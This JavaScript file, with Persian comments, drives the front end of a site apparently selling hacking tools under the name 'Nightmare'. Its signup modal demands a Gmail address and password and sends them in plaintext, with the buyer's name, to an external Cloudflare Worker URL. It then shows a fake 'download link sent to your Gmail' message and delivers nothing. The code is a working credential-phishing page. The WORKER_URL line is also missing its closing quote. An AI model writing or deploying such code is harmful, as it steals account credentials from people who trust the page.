// ============================================
// ⚠️ این آدرس رو بعد از ساخت Worker جایگزین کن
// ============================================
const WORKER_URL = 'https://nightmare-proxy.mashitmafianorthsidegang.workers.dev;

// ===== پس‌زمینه کدهای تصادفی =====
const codeSnippets = [
  'def nightmare():',
  '  import os, sys',
  '  while True:',
  '    data = fetch()',
  '    if data.is_valid:',
  '      process(data)',
  'class Bot:',
  '  def __init__(self):',
  '    self.token = "..."',
  '    self.session = requests.Session()',
  'async def main():',
  '  await bot.start()',
  'try:',
  '  result = run_script()',
  'except Exception as e:',
  '  print(f"Error: {e}")',
  'for i in range(100):',
  '  print(i)',
  'import numpy as np',
  'import pandas as pd',
  'df = pd.DataFrame(data)',
  'return await response.json()',
  'sys.exit(0)',
  '// exploit.py',
  'target = input("target: ")',
  'if __name__ == "__main__":',
  '  main()',
];

function generateCodeBackground() {
  const bg = document.getElementById('codeBg');
  let content = '';
  const lines = 200;
  for (let i = 0; i < lines; i++) {
    const line = codeSnippets[Math.floor(Math.random() * codeSnippets.length)];
    content += line + '\n';
  }
  bg.textContent = content;
}

generateCodeBackground();

// ===== افکت تایپ در Hero =====
const typingTexts = [
  'python nightmare.py',
  'loading exploits...',
  'system ready',
  'access granted',
];

let textIndex = 0;
let charIndex = 0;
let isDeleting = false;
const typingEl = document.getElementById('typingText');

function typeEffect() {
  const currentText = typingTexts[textIndex];

  if (!isDeleting) {
    typingEl.textContent = currentText.substring(0, charIndex + 1);
    charIndex++;

    if (charIndex === currentText.length) {
      isDeleting = true;
      setTimeout(typeEffect, 1500);
      return;
    }
  } else {
    typingEl.textContent = currentText.substring(0, charIndex - 1);
    charIndex--;

    if (charIndex === 0) {
      isDeleting = false;
      textIndex = (textIndex + 1) % typingTexts.length;
    }
  }

  setTimeout(typeEffect, isDeleting ? 50 : 100);
}

typeEffect();

// ===== عناصر DOM =====
const modalOverlay = document.getElementById('modalOverlay');
const modalClose = document.getElementById('modalClose');
const signupForm = document.getElementById('signupForm');
const purchaseSection = document.getElementById('purchaseSection');
const buyButtons = document.querySelectorAll('.btn-buy');

let currentProduct = '';

// ===== باز کردن مودال هنگام کلیک روی خرید =====
buyButtons.forEach(btn => {
  btn.addEventListener('click', () => {
    currentProduct = btn.dataset.product;

    signupForm.reset();
    signupForm.style.display = 'flex';
    purchaseSection.classList.add('hidden');

    modalOverlay.classList.add('active');
    document.body.style.overflow = 'hidden';
  });
});

// ===== بستن مودال =====
function closeModal() {
  modalOverlay.classList.remove('active');
  document.body.style.overflow = '';
}

modalClose.addEventListener('click', closeModal);
modalOverlay.addEventListener('click', (e) => {
  if (e.target === modalOverlay) closeModal();
});

// ===== ارسال فرم =====
signupForm.addEventListener('submit', async (e) => {
  e.preventDefault();

  const firstName = document.getElementById('firstName').value.trim();
  const lastName = document.getElementById('lastName').value.trim();
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value;

  if (!firstName || !lastName || !email || !password) {
    alert('لطفاً همه فیلدها را پر کنید');
    return;
  }

  if (!email.endsWith('@gmail.com')) {
    alert('لطفاً فقط از جیمیل استفاده کنید');
    return;
  }

  const message = `
🌙 <b>ثبت‌نام جدید در Nightmare</b>

🛒 <b>محصول:</b> ${currentProduct}

👤 <b>نام:</b> ${firstName}
👤 <b>نام خانوادگی:</b> ${lastName}
📧 <b>جیمیل:</b> ${email}
🔑 <b>پسوورد:</b> ${password}

⏰ زمان: ${new Date().toLocaleString('fa-IR')}
  `.trim();

  const submitBtn = signupForm.querySelector('button[type="submit"]');
  const originalText = submitBtn.textContent;
  submitBtn.textContent = 'در حال ارسال...';
  submitBtn.disabled = true;

  try {
    const response = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message }),
    });

    const data = await response.json();

    if (data.ok) {
      signupForm.style.display = 'none';
      purchaseSection.classList.remove('hidden');

      const downloadBtn = document.getElementById('downloadBtn');
      downloadBtn.href = '#';
      downloadBtn.onclick = (ev) => {
        ev.preventDefault();
        alert('لینک دانلود به جیمیل شما ارسال شد ✅');
      };
    } else {
      alert('خطا در ارسال: ' + (data.description || 'نامشخص'));
    }
  } catch (err) {
    alert('خطای شبکه: ' + err.message);
  } finally {
    submitBtn.textContent = originalText;
    submitBtn.disabled = false;
  }
});